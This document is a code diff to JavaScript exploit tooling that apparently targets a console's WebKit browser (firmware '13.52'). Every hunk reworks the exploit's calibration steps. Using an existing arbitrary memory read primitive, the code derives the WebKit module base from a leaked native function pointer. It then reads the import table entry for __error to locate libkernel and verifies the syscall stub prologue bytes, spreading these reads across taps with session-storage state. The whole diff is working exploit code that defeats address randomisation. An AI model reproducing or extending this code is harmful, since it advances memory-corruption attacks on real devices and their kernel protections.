@@ -151,6 +151,7 @@ function clearLog() {
     calibratedOff = null;
     primitiveDone = false;
     probeCache = null;
+    clearLkProgress();
     if (outEl) outEl.textContent = "";
     try { localStorage.removeItem(STORAGE_KEY); } catch (_) { }
 }
@@ -365,6 +366,10 @@ function applyManualExpm1(hexStr) {
         sessionStorage.setItem("wk-calibrated", JSON.stringify(calibratedOff));
         sessionStorage.removeItem("wk-cal-lite-i");
     } catch (_) { }
+    const nativeFn = nativeFnForCalibrate(off);
+    if (nativeFn)
+        cacheWebkitBase(nativeFn, delta);
+    clearLkProgress();
     mark("CAL-OK", "manual expm1=0x" + delta.toString(16) + " (0 scan reads)");
     saveSession();
     state("expm1 set — run step 2 verify", "ok");
@@ -448,10 +453,35 @@ function finishCalibrate(tableOff, mFunctionOff, delta, base, via) {
     try {
         sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
     } catch (_) { }
+    try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
+    clearLkProgress();
     mark("CAL-OK", via + " expm1=0x" + delta.toString(16) + " base=" + base);
     mark("PASTE-OFFSETS", JSON.stringify(live));
     try { sessionStorage.removeItem("wk-cal-lite-i"); } catch (_) { }
     return live;
+}
+
+function clearLkProgress() {
+    try {
+        sessionStorage.removeItem("wk-lk-step");
+        sessionStorage.removeItem("wk-lk-errorFn");
+        sessionStorage.removeItem("wk-lk-w0");
+    } catch (_) { }
+}
+
+function cacheWebkitBase(nativeFn, delta) {
+    if (!nativeFn || !(delta > 0)) return null;
+    const base = nativeFn.sub32(delta);
+    try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
+    return base;
+}
+
+function webkitBaseFromCal(off) {
+    const nativeFn = nativeFnForCalibrate(off);
+    if (!nativeFn || !off || !off.wk_expm1_builtin) return null;
+    const cached = parseNativeFnStr(sessionStorage.getItem("wk-webkitBase"));
+    if (cached) return cached;
+    return cacheWebkitBase(nativeFn, off.wk_expm1_builtin);
 }
 
 function tryTableErrorImportDirect(p, webkitBase, tableOff) {
@@ -485,29 +515,22 @@ function computeBases(p, off) {
     return { nativeFn, webkitBase, libkernelBase, errorFn };
 }
 
-function verifyBases(p, off, checkOffset) {
-    const b = computeBases(p, off);
-    if (!b) {
-        checkOffset("module-bases", false, "no offset table");
+function verifyBasesLite(off, checkOffset) {
+    if (!off || !off.wk_expm1_builtin) {
+        checkOffset("module-bases", false, "no expm1");
         return false;
     }
-    if (b.error && !b.libkernelBase) {
-        mark("BASES", "webkit=" + b.webkitBase + " nativeFn=" + b.nativeFn
-            + " (" + b.error + ")");
-        checkOffset("module-bases-webkit-aligned", alignedWebkitBase(b.webkitBase), "");
-        checkOffset("module-bases-libkernel", false, b.error);
+    const nativeFn = nativeFnForCalibrate(off);
+    if (!nativeFn) {
+        checkOffset("module-bases", false, "no nativeFn — re-run step 1");
         return false;
     }
-    mark("BASES", "webkit=" + b.webkitBase + " libkernel=" + b.libkernelBase
-        + " nativeFn=" + b.nativeFn);
-    const wkOk = alignedWebkitBase(b.webkitBase);
-    const lkOk = b.libkernelBase
-        ? (alignedWebkitBase(b.libkernelBase) || plausibleLibkernelBase(b.libkernelBase))
-        : false;
+    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    mark("BASES-WK", "webkit=" + webkitBase + " nativeFn=" + nativeFn + " (0 reads)");
+    const wkOk = alignedWebkitBase(webkitBase);
     checkOffset("module-bases-webkit-aligned", wkOk, "");
-    if (b.libkernelBase)
-        checkOffset("module-bases-libkernel-plausible", lkOk, "");
-    return wkOk && lkOk;
+    mark("SKIP-LK", "libkernel = step 3b only (1 read/tap, no leakval)");
+    return wkOk;
 }
 
 function bufAddr(p, off, ab) {
@@ -657,15 +680,9 @@ async function runOffsetTests() {
     }
 
     if (!calibratedOff) {
-        mark("SKIP-BASES", "cal failed in step 1 — retry step 3 or ?expm1=0x...");
+        mark("SKIP-BASES", "no expm1 — step 3 lite cal or set expm1");
     } else {
-        verifyBases(p, off, checkOffset);
-        const b = computeBases(p, off);
-        if (b && b.webkitBase && !off.k__error) {
-            const lk = tryTableErrorImportDirect(p, b.webkitBase, off);
-            if (lk)
-                mark("LK-OK", "libkernel=" + lk.libkernelBase);
-        }
+        verifyBasesLite(off, checkOffset);
     }
 
     const summary = passCount + " pass, " + failCount + " fail";
@@ -776,32 +793,105 @@ function runManualExpm1() {
 async function runLibkernelCheck() {
     const p = window.p;
     if (!p) throw new Error("run step 1 first");
-    if (!calibratedOff) throw new Error("calibrate first (step 1 or 3)");
+    if (!calibratedOff) throw new Error("calibrate first (step 3 or set expm1)");
 
-    const off = effectiveOff();
-    if (!off) throw new Error("no offsets");
+    preCalTrim();
+    logQuiet++;
+    try {
+        const off = effectiveOff();
+        if (!off) throw new Error("no offsets");
 
-    mark("STEP", "3b - libkernel check (3 reads)");
-    state("libkernel check...", "warn");
+        mark("STEP", "3b - libkernel lite (1 read/tap)");
+        state("libkernel lite...", "warn");
 
-    const b = computeBases(p, off);
-    if (!b || !b.webkitBase) {
-        mark("LK-FAIL", "webkit base unavailable");
-        state("libkernel check failed", "warn");
-        return;
-    }
+        const webkitBase = webkitBaseFromCal(off);
+        if (!webkitBase) {
+            mark("LK-FAIL", "no nativeFn — re-run step 1");
+            state("libkernel failed", "warn");
+            return;
+        }
+        if (!alignedWebkitBase(webkitBase)) {
+            mark("LK-FAIL", "webkit base not aligned: " + webkitBase);
+            state("libkernel failed", "warn");
+            return;
+        }
+        if (!off.wk___imp___error || !off.k__error) {
+            mark("LK-FAIL", "no IAT offsets in table");
+            state("libkernel failed", "warn");
+            return;
+        }
 
-    const hit = tryTableErrorImportDirect(p, b.webkitBase, off);
-    if (hit) {
-        mark("LK-OK", "libkernel=" + hit.libkernelBase);
+        let step = 0;
+        try { step = parseInt(sessionStorage.getItem("wk-lk-step") || "0", 10) || 0; } catch (_) { }
+
+        await new Promise(r => setTimeout(r, 64));
+
+        if (step === 0) {
+            mark("LK-TRY", "1/3 IAT webkit+" + off.wk___imp___error.toString(16));
+            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
+            if (!errorFn) {
+                clearLkProgress();
+                mark("LK-FAIL", "IAT read failed");
+                state("libkernel failed", "warn");
+                return;
+            }
+            try {
+                sessionStorage.setItem("wk-lk-errorFn", String(errorFn));
+                sessionStorage.setItem("wk-lk-step", "1");
+            } catch (_) { }
+            mark("LK-MORE", "tap 3b again (2/3)");
+            state("libkernel 1/3 — tap 3b", "warn");
+            return;
+        }
+
+        const errorFn = parseNativeFnStr(sessionStorage.getItem("wk-lk-errorFn"));
+        if (!errorFn) {
+            clearLkProgress();
+            mark("LK-FAIL", "lost IAT — tap 3b to restart");
+            state("libkernel failed", "warn");
+            return;
+        }
+        const lk = errorFn.sub32(off.k__error);
+
+        if (step === 1) {
+            mark("LK-TRY", "2/3 __error @ " + lk);
+            const w0 = read4p(p, lk);
+            if (w0 == null) {
+                clearLkProgress();
+                mark("LK-FAIL", "lk read failed");
+                state("libkernel failed", "warn");
+                return;
+            }
+            try {
+                sessionStorage.setItem("wk-lk-w0", "0x" + (w0 >>> 0).toString(16));
+                sessionStorage.setItem("wk-lk-step", "2");
+            } catch (_) { }
+            mark("LK-MORE", "tap 3b again (3/3)");
+            state("libkernel 2/3 — tap 3b", "warn");
+            return;
+        }
+
+        mark("LK-TRY", "3/3 verify prologue");
+        const w0 = parseInt(sessionStorage.getItem("wk-lk-w0") || "0", 16);
+        const w1 = read4p(p, lk.add32(4));
+        clearLkProgress();
+
+        if (w1 == null || !((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)) {
+            mark("LK-FAIL", "prologue mismatch w0=0x" + (w0 >>> 0).toString(16)
+                + " w1=0x" + (w1 == null ? "null" : (w1 >>> 0).toString(16)));
+            mark("HINT", "wk___imp___error / k__error may differ on 13.52");
+            state("libkernel failed", "warn");
+            return;
+        }
+
+        mark("LK-OK", "libkernel=" + lk);
         mark("LK-PASTE", JSON.stringify({
-            wk___imp___error: hit.wk___imp___error,
-            k__error: hit.k__error
+            wk___imp___error: off.wk___imp___error,
+            k__error: off.k__error
         }));
         state("libkernel OK", "ok");
-    } else {
-        mark("LK-FAIL", "table __error import did not verify @ webkit=" + b.webkitBase);
-        state("libkernel check failed", "warn");
+    } finally {
+        logQuiet--;
     }
 }
 
